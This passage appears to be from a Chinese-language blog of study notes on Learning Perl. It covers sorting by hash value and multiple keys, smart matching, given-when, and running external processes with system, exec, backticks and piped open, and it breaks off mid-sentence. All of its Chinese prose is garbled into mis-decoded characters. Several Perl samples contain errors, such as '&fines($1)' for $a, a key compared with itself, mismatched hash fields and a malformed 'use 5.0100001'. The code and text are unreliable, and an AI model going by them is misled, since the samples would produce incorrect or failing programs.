<br></code></pre></td></tr></table></figure><p>ä»¥é€’å‡çš„é¡ºåºè¿›è¡Œæ’åº, ä½¿ç”¨ <code>reverse</code> å‡½æ•°:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @numbers = <span class="hljs-keyword">reverse</span> &#123; $a &lt;=&gt; $b&#125; @some_numbers; <br></code></pre></td></tr></table></figure><h2 id="æŒ‰å“ˆå¸Œå€¼æ’åº"><a href="#æŒ‰å“ˆå¸Œå€¼æ’åº" class="headerlink" title="æŒ‰å“ˆå¸Œå€¼æ’åº"></a>æŒ‰å“ˆå¸Œå€¼æ’åº</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> %score = (<span class="hljs-string">&quot;barney&quot;</span> =&gt; <span class="hljs-number">195</span>, <span class="hljs-string">&quot;fred&quot;</span> =&gt; <span class="hljs-number">205</span>, <span class="hljs-string">&quot;dino&quot;</span> =&gt; <span class="hljs-number">30</span>);<br><br><span class="hljs-keyword">my</span> @winners = <span class="hljs-keyword">sort</span> by_score <span class="hljs-keyword">keys</span> %score;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">by_score</span> </span>&#123; $score&#123;$b&#125; &lt;=&gt; $score<span class="hljs-string">&#123;a&#125;</span> &#125;<br></code></pre></td></tr></table></figure><h2 id="æŒ‰å¤šä¸ªé”®æ’åº"><a href="#æŒ‰å¤šä¸ªé”®æ’åº" class="headerlink" title="æŒ‰å¤šä¸ªé”®æ’åº"></a>æŒ‰å¤šä¸ªé”®æ’åº</h2><p>ä¸Šé¢çš„ç±»å‹, ä½†æ˜¯æœ‰åˆ†æ•°ç›¸åŒæƒ…å†µ.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> %score = (<br><span class="hljs-string">&quot;barney&quot;</span>    =&gt; <span class="hljs-number">195</span>,<br><span class="hljs-string">&quot;fred&quot;</span>      =&gt; <span class="hljs-number">205</span>,<br><span class="hljs-string">&quot;dino&quot;</span>      =&gt; <span class="hljs-number">30</span>,<br><span class="hljs-string">&quot;bamm-bamm&quot;</span> =&gt; <span class="hljs-number">30</span>,<br>);<br><br><span class="hljs-keyword">my</span> @winners = <span class="hljs-keyword">sort</span> by_score_and_name <span class="hljs-keyword">keys</span> %score;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">by_score_and_name</span> </span>&#123;<br>    $score&#123;$b&#125; &lt;=&gt; $score&#123;$a&#125; <br>    <span class="hljs-keyword">or</span> <br>    $a cmp $b<br>&#125;<br></code></pre></td></tr></table></figure><p>æ’åºçš„çº§æ•°å¯ä»¥ä¸æ­¢ä¸¤çº§, ä¹¦ä¸­çš„ç¤ºä¾‹äº”çº§ä»£ç :</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl">@patron_IDs = <span class="hljs-keyword">sort</span> &#123;<br>    &amp;fines($b) &lt;=&gt; &amp;fines($1) <span class="hljs-keyword">or</span><br>    $items&#123;$b&#125; &lt;=&gt; $items&#123;$b&#125; <span class="hljs-keyword">or</span><br>    $family_name&#123;$a&#125; cmp $family_name&#123;$b&#125; <span class="hljs-keyword">or</span><br>    $personal_name&#123;$a&#125; cmp $family_name&#123;$b&#125; <span class="hljs-keyword">or</span><br>    $a &lt;=&gt; $b<br>&#125; @patron_IDs;<br></code></pre></td></tr></table></figure><h1 id="ç¬¬åäº”ç« -æ™ºèƒ½åŒ¹é…ä¸-given-when-ç»“æ„"><a href="#ç¬¬åäº”ç« -æ™ºèƒ½åŒ¹é…ä¸-given-when-ç»“æ„" class="headerlink" title="ç¬¬åäº”ç«  æ™ºèƒ½åŒ¹é…ä¸ given-when ç»“æ„"></a>ç¬¬åäº”ç«  æ™ºèƒ½åŒ¹é…ä¸ given-when ç»“æ„</h1><p>æ™ºèƒ½åŒ¹é…æ˜¯ä» Perl 5.10.0 å¼€å§‹å‡ºç°çš„.</p><h2 id="æ™ºèƒ½åŒ¹é…æ“ä½œç¬¦"><a href="#æ™ºèƒ½åŒ¹é…æ“ä½œç¬¦" class="headerlink" title="æ™ºèƒ½åŒ¹é…æ“ä½œç¬¦"></a>æ™ºèƒ½åŒ¹é…æ“ä½œç¬¦</h2><p>æ™ºèƒ½åŒ¹é…æ“ä½œç¬¦ <code>~~</code> ä¼šæ ¹æ®ä¸¤è¾¹çš„æ“ä½œæ•°çš„æ•°æ®ç±»å‹è‡ªåŠ¨åˆ¤æ–­æ”¹ç”¨ä½•ç§æ–¹å¼è¿›è¡Œæ¯”è¾ƒæˆ–åŒ¹é…. æœ‰æ—¶, ç”šè‡³èƒ½å–ä»£ç»‘å®šæ“ä½œç¬¦ <code>=~</code></p><p>å¦‚åœ¨å“ˆç³» <code>%name</code> ä¸­æŸ¥æ‰¾ä»»ä½•åŒ¹é… <code>Fred</code> çš„é”®:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> <span class="hljs-number">5.0100001</span>;<br><br><span class="hljs-keyword">say</span> <span class="hljs-string">&quot;I found a key matching &#x27;Fred&#x27;&quot;</span> <span class="hljs-keyword">if</span> %names ~~ <span class="hljs-regexp">/Fred/</span>;<br></code></pre></td></tr></table></figure><p>å¯å‚è€ƒ perlsyn æ–‡æ¡£ä¸­å…³äºæ™ºèƒ½åŒ¹é…çš„è¡¨. (Smart matching in detail)</p><h2 id="æ™ºèƒ½åŒ¹é…æ“ä½œçš„ä¼˜å…ˆçº§"><a href="#æ™ºèƒ½åŒ¹é…æ“ä½œçš„ä¼˜å…ˆçº§" class="headerlink" title="æ™ºèƒ½åŒ¹é…æ“ä½œçš„ä¼˜å…ˆçº§"></a>æ™ºèƒ½åŒ¹é…æ“ä½œçš„ä¼˜å…ˆçº§</h2><p>å½“ä½¿ç”¨æ™ºèƒ½åŒ¹é…æ“ä½œç¬¦æ—¶, Perl ä¼šæŒ‰è¡¨è‡ªä¸Šè€Œä¸‹æŸ¥çœ‹é€‚ç”¨çš„æ“ä½œä¹¦é…å¯¹, å…ˆæ‰¾åˆ°å“ªä¸€ç§æ­é…å°±é€‰æ‹©å“ªä¸€ç§æ“ä½œ.</p><h2 id="given-è¯­å¥"><a href="#given-è¯­å¥" class="headerlink" title="given è¯­å¥"></a>given è¯­å¥</h2><p><code>given-when</code> æ§åˆ¶ç»“æ„èƒ½å¤Ÿæ ¹æ® given åé¢çš„å‚æ•°æ‰§è¡ŒæŸä¸ªæ¡ä»¶å¯¹åº”çš„è¯­å¥å—. å’Œ C ä¸­çš„ switch è¯­å¥å¯¹åº”.</p><p>éšå¼å†™æ³•:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> <span class="hljs-number">5.0100001</span><br><br><span class="hljs-keyword">given</span> ( $ARGV[<span class="hljs-number">0</span>] ) &#123;<br>    <span class="hljs-keyword">when</span> ( <span class="hljs-string">&#x27;Fred&#x27;</span> )     &#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Name is Fred&#x27;</span> &#125;<br>    <span class="hljs-keyword">when</span> ( <span class="hljs-regexp">/fred/i</span> )    &#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Name has fred in it&#x27;</span> &#125;<br>    <span class="hljs-keyword">when</span> ( <span class="hljs-regexp">/\AFred/</span> )   &#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Name starts with Fred&#x27;</span> &#125;<br>    default             &#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&quot;I don&#x27;t see a Fred&quot;</span> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ˜¾å¼å†™æ³•:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> <span class="hljs-number">5.0100001</span><br><br><span class="hljs-keyword">given</span> ( $ARGV[<span class="hljs-number">0</span>] ) &#123;<br>    <span class="hljs-keyword">when</span> ( $_ ~~ <span class="hljs-string">&#x27;Fred&#x27;</span> )     &#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Name is Fred&#x27;</span>; <span class="hljs-keyword">break</span> &#125;<br>    <span class="hljs-keyword">when</span> ( $_ ~~ <span class="hljs-regexp">/fred/i</span> )    &#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Name has fred in it&#x27;</span>; <span class="hljs-keyword">break</span> &#125;<br>    <span class="hljs-keyword">when</span> ( $_ ~~ <span class="hljs-regexp">/\AFred/</span> )   &#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Name starts with Fred&#x27;</span>; <span class="hljs-keyword">break</span> &#125;<br>    default             &#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&quot;I don&#x27;t see a Fred&quot;</span>; <span class="hljs-keyword">break</span> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æœ‰æ™ºèƒ½åŒ¹é…å’Œ <code>break</code>.</p><p><code>given-when</code> å¯ä»¥åœ¨æ»¡è¶³æŸä¸ªæ¡ä»¶çš„åŸºç¡€ä¸Šç»§ç»­æµ‹è¯•å…¶ä»–æ¡ä»¶, åœ¨ <code>when</code> è¯­å¥å—çš„æœ«å°¾ä½¿ç”¨ <code>continue</code>, Perl å°±ä¼šå°è¯•æ‰§è¡Œåç»­çš„ <code>when</code> è¯­å¥.</p><h2 id="ç¬¨æ‹™åŒ¹é…"><a href="#ç¬¨æ‹™åŒ¹é…" class="headerlink" title="ç¬¨æ‹™åŒ¹é…"></a>ç¬¨æ‹™åŒ¹é…</h2><p>æŒ‡è‡ªå·±æ˜ç¡®ä¹¦å†™æ“ä½œç¬¦:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> <span class="hljs-number">5.0100001</span>;<br><br><span class="hljs-keyword">given</span> ( $ARGV[<span class="hljs-number">0</span>] ) &#123;<br>    <span class="hljs-keyword">when</span> ( $_ eq <span class="hljs-string">&#x27;Fred&#x27;</span>)    &#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Name is Fred&#x27;</span>; <span class="hljs-keyword">continue</span> &#125;<br>    <span class="hljs-keyword">when</span> ( $_ =~ <span class="hljs-regexp">/\AFred/</span> ) &#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Name starts with Fred&#x27;</span>; <span class="hljs-keyword">continue</span> &#125;<br>    <span class="hljs-keyword">when</span> ( $_ =~ <span class="hljs-regexp">/fred/i</span> )  &#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Name has fred in it&#x27;</span>; &#125;<br>    default                 &#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Name is Fred&#x27;</span> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥æ™ºèƒ½åŒ¹é…å’Œç¬¨æ‹™åŒ¹é…æ··ç”¨.</p><p>æ™ºèƒ½åŒ¹é…æ“ä½œç¬¦ç”¨äºåˆ¤æ–­äº‹ç‰©æ˜¯å¦ç›¸åŒ (æˆ–è€…å·®ä¸å¤šæ˜¯ç›¸åŒ), æ‰€ä»¥åœ¨éœ€è¦æ¯”è¾ƒå¤§å°æ—¶, å°±ä¸èƒ½ç”¨æ™ºèƒ½åŒ¹é….</p><p>å¦å®šçš„è¡¨è¾¾å¼, åŒ…æ‹¬å¦å®šçš„æ­£åˆ™è¡¨è¾¾å¼, éƒ½ä¸ä¼šä½¿ç”¨æ™ºèƒ½åŒ¹é…æ–¹å¼.</p><h2 id="å¤šä¸ªæ¡ç›®çš„-when-åŒ¹é…"><a href="#å¤šä¸ªæ¡ç›®çš„-when-åŒ¹é…" class="headerlink" title="å¤šä¸ªæ¡ç›®çš„ when åŒ¹é…"></a>å¤šä¸ªæ¡ç›®çš„ when åŒ¹é…</h2><p>è¦éå†å¤šä¸ªå…ƒç´ , å¯ä»¥ç›´æ¥çœç•¥ <code>given</code>, è®© <code>foreach</code> å°†å½“å‰æ­£åœ¨éå†çš„å…ƒç´ æ”¾å…¥å®ƒè‡ªå·±çš„ <code>$_</code> é‡Œ:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> <span class="hljs-number">5.0100001</span>;<br><br><span class="hljs-keyword">foreach</span> ( @name ) &#123;<br>    <span class="hljs-keyword">when</span> ( <span class="hljs-regexp">/fred/i</span> )    &#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Name has fred in it&#x27;</span>; <span class="hljs-keyword">continue</span> &#125;<br>    <span class="hljs-keyword">when</span> ( <span class="hljs-regexp">/\AFred/</span> )   &#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Name starts with Fred&#x27;</span>; <span class="hljs-keyword">continue</span> &#125;<br>    <span class="hljs-keyword">when</span> ( <span class="hljs-regexp">/fred/i</span> )    &#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Name has fred in it&#x27;</span>; &#125;<br>    default             &#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Name is Fred&#x27;</span> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ç¬¬åå…­ç« -è¿›ç¨‹ç®¡ç†"><a href="#ç¬¬åå…­ç« -è¿›ç¨‹ç®¡ç†" class="headerlink" title="ç¬¬åå…­ç«  è¿›ç¨‹ç®¡ç†"></a>ç¬¬åå…­ç«  è¿›ç¨‹ç®¡ç†</h1><h2 id="system-å‡½æ•°"><a href="#system-å‡½æ•°" class="headerlink" title="system å‡½æ•°"></a>system å‡½æ•°</h2><p>ç”¨äºå¯åŠ¨å­è¿›ç¨‹.</p><p>è°ƒç”¨ Unix çš„ date å‘½ä»¤:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">system</span> <span class="hljs-string">&#x27;date&#x27;</span>;<br></code></pre></td></tr></table></figure><p>æ­¤æ—¶çš„ Perl ç¨‹åºç§°ä¸ºçˆ¶è¿›ç¨‹ (parent). è¿è¡Œæ—¶, <code>system</code> å‘½ä»¤æ ¹æ®å½“å‰çš„çˆ¶è¿›ç¨‹åˆ›å»ºä¸€ä»½æ‹·è´, è¿™ä»½æ‹·è´ç§°ä¸ºå­è¿›ç¨‹ (child), å…¶ç»§æ‰¿äº†åŸæ¥è¿›ç¨‹ä¸­ Perl çš„æ ‡å‡†è¾“å…¥, æ ‡å‡†è¾“å‡ºä»¥åŠæ ‡å‡†é”™è¯¯.</p><p>é€šå¸¸æä¾›ç»™ system å‡½æ•°çš„å‚æ•°å°±æ˜¯é‚£äº›ä¸€èˆ¬åœ¨ shell ä¸­é”®å…¥çš„å‘½ä»¤.</p><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">system</span> <span class="hljs-string">&#x27;ls -l $HOME&#x27;</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œç”¨çš„å•å¼•å·, å¦åˆ™ä¼šè¢«è®¤ä¸ºæ˜¯ Perl ä¸­çš„æ ‡é‡ç¬¦å·.</p><p>å½“å‘½ä»¤ç®€å•æ—¶, ä¸ä¼šè°ƒç”¨ <code>/bin/sh</code> è¿™ç§ shell.</p><h2 id="é¿å…ä½¿ç”¨-Shell"><a href="#é¿å…ä½¿ç”¨-Shell" class="headerlink" title="é¿å…ä½¿ç”¨ Shell"></a>é¿å…ä½¿ç”¨ Shell</h2><p>ä½¿ç”¨å¤šä¸ªå‚æ•°æ¥è°ƒç”¨:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $tarfile = <span class="hljs-string">&#x27;something*wicked.tar&#x27;</span>;<br><span class="hljs-keyword">my</span> @dirs = <span class="hljs-string">qw(fred|flintstone &lt;barney&amp;rubble&gt; betty )</span>;<br><span class="hljs-keyword">system</span> <span class="hljs-string">&#x27;tar&#x27;</span>, <span class="hljs-string">&#x27;cvf&#x27;</span>, $tarfile, @dirs;<br></code></pre></td></tr></table></figure><p><code>system</code> æ“ä½œç¬¦çš„è¿”å›å€¼æ˜¯æ ¹æ®å­è¿›ç¨‹çš„ç»“æŸçŠ¶æ€æ¥å†³å®šçš„.</p><h2 id="ç¯å¢ƒå˜é‡"><a href="#ç¯å¢ƒå˜é‡" class="headerlink" title="ç¯å¢ƒå˜é‡"></a>ç¯å¢ƒå˜é‡</h2><p>Perl ä¼šåœ¨éœ€è¦æ—¶ç”¨ PATH ç¯å¢ƒå˜é‡æ¥æœç´¢ç¨‹åºä»¥ä¾¿è¿è¡Œ.</p><p>åœ¨ Perl ä¸­, ç¯å¢ƒå˜é‡å¯é€šè¿‡ç‰¹æ®Šçš„ <code>%ENV</code> å“ˆå¸Œå–å¾—, å…¶ä¸­æ¯ä¸ªé”®éƒ½ä»£è¡¨ä¸€ä¸ªç¯å¢ƒå˜é‡. åœ¨ç¨‹åºå¼€å§‹è¿è¡Œæ—¶, <code>%ENV</code> ä¼šä¿ç•™ä»çˆ¶è¿›ç¨‹ (é€šå¸¸ä¸º shell) ç»§æ‰¿è€Œæ¥çš„è®¾å®šå€¼, ä¿®æ”¹æ¬¡å“ˆå¸Œå°±èƒ½æ”¹å˜ç¯å¢ƒå˜é‡, å®ƒä¼šè¢«æ–°è¿›ç¨‹ç»§æ‰¿.</p><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">$ENV&#123;<span class="hljs-string">&#x27;PATH&#x27;</span>&#125; = <span class="hljs-string">&quot;/home/rootbeer/bin:$ENV&#123;&#x27;PATH&#x27;&#125;&quot;</span>;<br></code></pre></td></tr></table></figure><h2 id="exec-å‡½æ•°"><a href="#exec-å‡½æ•°" class="headerlink" title="exec å‡½æ•°"></a>exec å‡½æ•°</h2><p>æ‰€æœ‰é€‚ç”¨äº <code>system</code> å‡½æ•°çš„æ‰€æœ‰è¯­æ³•ä¹Ÿéƒ½é€‚ç”¨äº <code>exec</code> å‡½æ•°.</p><p>åŒºåˆ«: <code>system</code> å‡½æ•°ä¼šåˆ›å»ºå­è¿›ç¨‹, å­è¿›ç¨‹ä¼šåœ¨ Perl ç¡çœ æœŸé—´æ‰§è¡Œä»»åŠ¡. <code>exec</code> å‡½æ•°å´å¯¼è‡´ Perl è¿›ç¨‹è‡ªå·±å»æ‰§è¡Œä»»åŠ¡. </p><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">chdir</span> <span class="hljs-string">&#x27;/tmp&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Cannot chdir /tmp: $!&quot;</span>;<br><span class="hljs-keyword">exec</span> <span class="hljs-string">&#x27;bedrock&#x27;</span>, <span class="hljs-string">&#x27;-o&#x27;</span>, <span class="hljs-string">&#x27;args1&#x27;</span>, @ARGV;<br></code></pre></td></tr></table></figure><p>å½“è¿è¡Œåˆ° exec æ—¶, Perl æ‰¾åˆ° <code>bedrock</code> å¹¶ä¸” â€œè·³è¿›å»â€ æ‰§è¡Œ, æ­¤å, å°±æ²¡æœ‰ Perl è¿›ç¨‹äº†, åªæœ‰é‚£ä¸ªè¿è¡Œ <code>bedrock</code> å‘½ä»¤çš„è¿›ç¨‹, è¿™æ ·åœ¨ <code>bedrock</code> è¿è¡Œç»“æŸæ—¶, æ²¡æœ‰ Perl è¿›ç¨‹åœ¨ç­‰å¾…. (ä¹Ÿå°±æ˜¯è¯´, Perl åˆ›å»ºäº†ä¸€ä¸ªå­è¿›ç¨‹, ç„¶åè¢«è¿™ä¸ªå­è¿›ç¨‹æ›¿æ¢æ‰)</p><p><code>exec</code> è°ƒç”¨ä¹‹åå†™çš„ä»£ç éƒ½æ— æ³•è¿è¡Œ. ä¸è¿‡å¦‚æœå¯åŠ¨è¿‡ç¨‹å‡ºç°é”™è¯¯, é‚£ä¹ˆåç»­çš„æ•è·è¯­å¥è¿˜æ˜¯å¯ä»¥ç»§ç»­è¿è¡Œçš„:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">exec</span> <span class="hljs-string">&#x27;date&#x27;</span>;<br><span class="hljs-keyword">die</span> <span class="hljs-string">&quot;date couldn&#x27;t run: $!&quot;</span>;<br></code></pre></td></tr></table></figure><h2 id="ç”¨åå¼•å·æ•è·è¾“å‡ºç»“æœ"><a href="#ç”¨åå¼•å·æ•è·è¾“å‡ºç»“æœ" class="headerlink" title="ç”¨åå¼•å·æ•è·è¾“å‡ºç»“æœ"></a>ç”¨åå¼•å·æ•è·è¾“å‡ºç»“æœ</h2><p>æ— è®ºæ˜¯ <code>system</code> è¿˜æ˜¯ <code>exec</code>, æ‰€æ‰§è¡Œå‘½ä»¤çš„è¾“å‡ºéƒ½ä¼šé€å¾€ Perl çš„æ ‡å‡†è¾“å‡º.</p><p>å¯ä»¥ç”¨ â€œ``â€œ æ¥æ•è·è¾“å‡º.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $now = <span class="hljs-string">`date`</span>;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;The time is now $now&quot;</span>;<br></code></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œæ²¡æœ‰è‡ªåŠ¨å»é™¤æ¢è¡Œç¬¦. åå¼•å·ä¼šä»¥åŒå¼•å·å†…çš„å­—ç¬¦ä¸²çš„æ–¹å¼è§£é‡Š, å³å¯ä»¥ä½¿ç”¨ Perl ä¸­çš„å˜é‡.</p><p>é™¤åå¼•å·å¤–, è¿˜å¯ä»¥ä½¿ç”¨å¼•èµ·æ“ä½œç¬¦ <code>qx()</code>. åˆ†éš”ç¬¦å¯æ¢, å¦‚ç”¨ <code>qx&#39;&#39;</code> é¿å…å˜é‡å†…æ’.</p><p>å¯å°†æ ‡å‡†è¾“å…¥é‡å®šå‘åˆ° <code>/dev/null</code> æ¥é¿å…è¾“å…¥:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $result = <span class="hljs-string">`some_questionable_command arg arg argh &lt;/dev/null`</span>;<br></code></pre></td></tr></table></figure><h2 id="åœ¨åˆ—è¡¨ä¸Šä¸‹æ–‡ä¸­ä½¿ç”¨åå¼•å·"><a href="#åœ¨åˆ—è¡¨ä¸Šä¸‹æ–‡ä¸­ä½¿ç”¨åå¼•å·" class="headerlink" title="åœ¨åˆ—è¡¨ä¸Šä¸‹æ–‡ä¸­ä½¿ç”¨åå¼•å·"></a>åœ¨åˆ—è¡¨ä¸Šä¸‹æ–‡ä¸­ä½¿ç”¨åå¼•å·</h2><p>å¦‚æœå‘½ä»¤è¾“å‡ºå¾ˆå¤šè¡Œ, é‚£ä¹ˆæ ‡é‡ä¸Šä¸‹æ–‡ä¸­ä½¿ç”¨åå¼•å·ä¼šå¾—åˆ°ä¸€ä¸ªå¾ˆé•¿çš„å­—ç¬¦ä¸², å…¶ä¸­åŒ…å«æ¢è¡Œç¬¦. ä¸è¿‡, å¦‚æœæ˜¯åœ¨åˆ—è¡¨ä¸Šä¸‹æ–‡ä½¿ç”¨åŒæ ·çš„åå¼•å·, åˆ™ä¼šè¾“å‡ºå­—ç¬¦ä¸²æŒ‰è¡Œæ‹†åˆ†çš„åˆ—è¡¨.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @who_lines = <span class="hljs-string">`who`</span>;<br></code></pre></td></tr></table></figure><p><code>@who_lines</code> ä¸­æœ‰å¤šä¸ªä»¥æ¢è¡Œç¬¦ç»“å°¾çš„å­—ç¬¦ä¸².</p><h2 id="ç”¨-IPC-System-Simple-æ‰§è¡Œå¤–éƒ¨è¿›ç¨‹"><a href="#ç”¨-IPC-System-Simple-æ‰§è¡Œå¤–éƒ¨è¿›ç¨‹" class="headerlink" title="ç”¨ IPC::System::Simple æ‰§è¡Œå¤–éƒ¨è¿›ç¨‹"></a>ç”¨ IPC::System::Simple æ‰§è¡Œå¤–éƒ¨è¿›ç¨‹</h2><p>å…¶éœ€è¦ä» CPAN ä¸‹è½½.</p><p>å¯ç›´æ¥ä½¿ç”¨è¯¥æ¨¡å—æä¾›çš„åŒåå‡½æ•°å–ä»£å†…ç½®çš„ <code>system</code> å‡½æ•°, ä½†å…¶å¯ç§»æ¤æ€§æ›´å¥½.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> IPC::System::Simple <span class="hljs-string">qw(system)</span>;<br><br><span class="hljs-keyword">my</span> $tarfile = <span class="hljs-string">&#x27;something*wicked.tar&#x27;</span>;<br><span class="hljs-keyword">my</span> @dirs = <span class="hljs-string">qw(fred|flintstone &lt;barney&amp;rubble betty&gt;)</span>;<br><span class="hljs-keyword">system</span> <span class="hljs-string">&#x27;tar&#x27;</span>, <span class="hljs-string">&#x27;cvf&#x27;</span>, $tarfile, @dirs;<br></code></pre></td></tr></table></figure><p>æä¾›çš„ <code>systemx</code> å‡½æ•°åœ¨æ‰§è¡Œå¤–éƒ¨å‘½ä»¤æ—¶ä¸ä¼šé€šè¿‡ shell è°ƒç”¨.</p><p>æ•è·å¤–éƒ¨å‘½ä»¤çš„è¾“å‡º, ä½¿ç”¨ <code>capture</code> æˆ– <code>capturex</code>.</p><h2 id="é€šè¿‡æ–‡ä»¶å¥æŸ„æ‰§è¡Œå¤–éƒ¨çš„è¿›ç¨‹"><a href="#é€šè¿‡æ–‡ä»¶å¥æŸ„æ‰§è¡Œå¤–éƒ¨çš„è¿›ç¨‹" class="headerlink" title="é€šè¿‡æ–‡ä»¶å¥æŸ„æ‰§è¡Œå¤–éƒ¨çš„è¿›ç¨‹"></a>é€šè¿‡æ–‡ä»¶å¥æŸ„æ‰§è¡Œå¤–éƒ¨çš„è¿›ç¨‹</h2><p>å¹¶å‘å¼è¿è¡Œå­è¿›ç¨‹, å°†å‘½ä»¤æ”¾åœ¨ <code>open</code> è°ƒç”¨é“å¾·æ–‡ä»¶åéƒ¨åˆ†, å¹¶ä¸”åœ¨å®ƒå‰é¢æˆ–åé¢åŠ ä¸Šç«–çº¿ (å³ç®¡é“ç¬¦å·), ä¸¤ä¸ªå‚æ•°çš„å½¢å¼å¦‚ä¸‹:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">open</span> DATE, <span class="hljs-string">&#x27;date|&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;cannot pipe from date: $!&quot;</span>;<br><span class="hljs-keyword">open</span> MAIL, <span class="hljs-string">&#x27;|mail merlyn&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;cannot pipe to mail: $!&quot;</span>;<br></code></pre></td></tr></table></figure><p><code>|</code> åœ¨å³è¾¹è¡¨ç¤ºè¯¥å‘½ä»¤çš„æ ‡å‡†è¾“å‡ºè¿æ¥åˆ° <code>DATE</code>.</p><p><code>|</code> 